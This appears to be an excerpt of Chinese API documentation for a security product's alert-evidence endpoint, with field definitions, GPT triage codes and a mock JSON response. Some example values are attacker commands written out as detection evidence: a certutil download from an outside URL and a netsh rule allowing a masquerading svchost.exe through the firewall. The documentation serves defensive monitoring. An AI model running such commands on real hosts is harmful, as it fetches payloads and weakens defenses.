+[ "TA0011.T1104" ]
+最小长度：
+最大长度：
+最小值：
+最大值：
+matchPros
+[array]
+-	父进程名称	[ "taskeng.exe"]	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+[ "taskeng.exe"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+domain
+[string]
+-	原始告警-域名	"xmr.crypto-pool.fr"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"xmr.crypto-pool.fr"
+最小长度：
+最大长度：
+最小值：
+最大值：
+vulInfo
+[string]
+-	原始告警-漏洞信息	"远程命令执行漏洞"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"远程命令执行漏洞"
+最小长度：
+最大长度：
+最小值：
+最大值：
+cve
+[string]
+-	原始告警-CVE编号	"CVE-2021-33739"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"CVE-2021-33739"
+最小长度：
+最大长度：
+最小值：
+最大值：
+vulType
+[string]
+-	原始告警-漏洞类型	"命令注入"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"命令注入"
+最小长度：
+最大长度：
+最小值：
+最大值：
+appType
+[string]
+-	原始告警-应用类型	"weblogc 1.0.0"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"weblogc 1.0.0"
+最小长度：
+最大长度：
+最小值：
+最大值：
+languageType
+[string]
+-	原始告警-语言类型	"java 1.8/php 7.0"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"java 1.8/php 7.0"
+最小长度：
+最大长度：
+最小值：
+最大值：
+proto
+[string]
+-	原始告警-协议	"TCP"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"TCP"
+最小长度：
+最大长度：
+最小值：
+最大值：
+ruleName
+[string]
+-	原始告警-规则名称	"通过Certutil下载可疑文件"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"通过Certutil下载可疑文件"
+最小长度：
+最大长度：
+最小值：
+最大值：
+cmdLine
+[string]
+-	原始告警-命令行	"cmd.exe /c certutil -urlcache -split -f http://cert.beah.com/cert.php"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"cmd.exe /c certutil -urlcache -split -f http://cert.beah.com/cert.php"
+最小长度：
+最大长度：
+最小值：
+最大值：
+name
+[string]
+-	原始告警-文件名称/进程名称	"cmd.exe"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"cmd.exe"
+最小长度：
+最大长度：
+最小值：
+最大值：
+pid
+[string]
+-	原始告警-进程pid	"3888"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"3888"
+最小长度：
+最大长度：
+最小值：
+最大值：
+path
+[string]
+-	原始告警-文件路径	"c:\\windows\\system32\\cmd.exe"	收缩	
+参数限制：
+E侧告警，IOC、IOA、webshell等举证
+参数示例：
+"c:\\windows\\system32\\cmd.exe"
+最小长度：
+最大长度：
+最小值：
+最大值：
+regKey
+[string]
+-	原始告警-注册表Key	"c:\\windows\\system32\\cmd.exe"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"c:\\windows\\system32\\cmd.exe"
+最小长度：
+最大长度：
+最小值：
+最大值：
+regValue
+[string]
+-	原始告警-注册表值	"\"C:\\Users\\Sangfor\\AppData\\Local\\Package Cache\\{c60fd5ac-367d-4e3a-a975-f157502ac30a}\\python-3.10.2-amd64.exe\" /burn.runonce"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"\"C:\\Users\\Sangfor\\AppData\\Local\\Package Cache\\{c60fd5ac-367d-4e3a-a975-f157502ac30a}\\python-3.10.2-amd64.exe\" /burn.runonce"
+最小长度：
+最大长度：
+最小值：
+最大值：
+fileMd5
+[string]
+-	原始告警-文件md5	"82713bc7177862a0d804e6059c8920ef"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"82713bc7177862a0d804e6059c8920ef"
+最小长度：
+最大长度：
+最小值：
+最大值：
+user
+[string]
+-	原始告警-任务用户	"S-1-5-18"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"S-1-5-18"
+最小长度：
+最大长度：
+最小值：
+最大值：
+taskFrequency
+[string]
+-	原始告警-任务频率	"50 MINUTE"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"50 MINUTE"
+最小长度：
+最大长度：
+最小值：
+最大值：
+gptResult
+[int]
+是	GPT研判结论	115	收缩	
+数据字典：
+0	| [int]
+|
+等待GPT研判
+| 默认值
+110	| [int]
+|
+真实攻击成功
+115	| [int]
+|
+主机失陷活动
+120	| [int]
+|
+病毒木马活动
+130	| [int]
+|
+真实攻击未成功
+140	| [int]
+|
+脆弱性访问
+150	| [int]
+|
+疑似攻击行为
+160	| [int]
+|
+误报
+170	| [int]
+|
+数据不足
+180	| [int]
+|
+自定义类型
+参数示例：
+115
+最小长度：
+最大长度：
+最小值：
+最大值：
+gptResultDescription
+[string]
+是	GPT研判结论中文描述	主机失陷活动	收缩	
+数据字典：
+等待GPT研判	| [string]	| 默认值
+真实攻击成功	| [string]
+主机失陷活动	| [string]
+病毒木马活动	| [string]
+真实攻击未成功	| [string]
+脆弱性访问	| [string]
+疑似攻击行为	| [string]
+误报	| [string]
+数据不足	| [string]
+自定义类型	| [string]
+参数示例：
+主机失陷活动
+最小长度：
+最大长度：
+返回示例
+
+成功示例失败示例
+
+请求地址：http://200.200.24.160/index.php/apiManagementPro/Mock/simple/Yjjhj5yb18f3aee38b70a9b9f64b09b80aee830b7ab9042?uri=/api/xdr/v1/alerts/:uuid/proof
+
+{
+    "code":"Success",
+    "message":"成功",
+    "data":Θ{
+        "uuId":"alert-346b0f00-7291-42c8-abce-36d2cc6169db",
+        "name":"通过可疑进程创建网络连接;伪装系统文件",
+        "severity":90,
+        "threatDefine":Θ[
+            0
+        ],
+        "direction":0,
+        "attackResult":3,
+        "threatSubTypeDesc":"后门工具",
+        "stage":40,
+        "engineName":Θ[
+            "IOA引擎"
+        ],
+        "logCount":1,
+        "lastTime":1686585600,
+        "srcIp":Θ[
+
+        ],
+        "srcPort":Θ[
+
+        ],
+        "dstIp":Θ[
+
+        ],
+        "dstPort":Θ[
+
+        ],
+        "devSourceName":Θ[
+            "EDR (34334002651)"
+        ],
+        "dealStatus":1,
+        "proof":Θ{
+            "engineName":Θ[
+                "IOA引擎"
+            ],
+            "virusName":Θ[
+
+            ],
+            "fileMd5":Θ[
+
+            ],
+            "url":Θ[
+
+            ],
+            "domain":Θ[
+
+            ],
+            "virusFamily":"",
+            "virusLibVersion":"",
+            "virusType":"",
+            "bfStartTime":0,
+            "bfEndTime":0,
+            "bfIpList":"",
+            "bfDuration":0,
+            "bfType":0,
+            "bfCount":0,
+            "bfProtocol":"",
+            "scanStartTime":0,
+            "scanEndTime":0,
+            "scanDuration":0,
+            "scanType":0,
+            "scanCount":0,
+            "fileId":"",
+            "filePath":"",
+            "fileSize":0,
+            "fileName":"",
+            "fileCreateTime":0,
+            "fileClass":0,
+            "fileStatus":0,
+            "webshellFindType":0,
+            "webshellDomainRoot":"",
+            "rawProofData":""
+        },
+        "originalAlert":Θ{
+            "dataType":"PROCESS_OPR_ACTION",
+            "engineName":"IOA",
+            "srcIp":"",
+            "dstIp":"",
+            "mitreIds":Θ[
+                "TA0005.T1562.001"
+            ],
+            "matchPros":Θ[
+                "svchost.exe"
+            ],
+            "domain":"",
+            "vulInfo":"",
+            "cve":"",
+            "vulType":"",
+            "appType":"",
+            "languageType":"",
+            "proto":"",
+            "ruleName":"通过命令添加防火墙白名单",
+            "cmdLine":"netsh advfirewall firewall add rule name=windows-update dir=in action=allow profile=any program=C:\Windows\Temp\svchost.exe",
+            "name":"netsh.exe",
+            "pid":"9844",
+            "path":"c:\windows\system32\netsh.exe",
+            "regKey":"",
+            "regValue":"",
+            "fileMd5":"",
+            "user":"",
+            "taskFrequency":""
+        },
+        "gptResult":115,
+        "gptResultDescription":"主机失陷活动"
+    }
+}
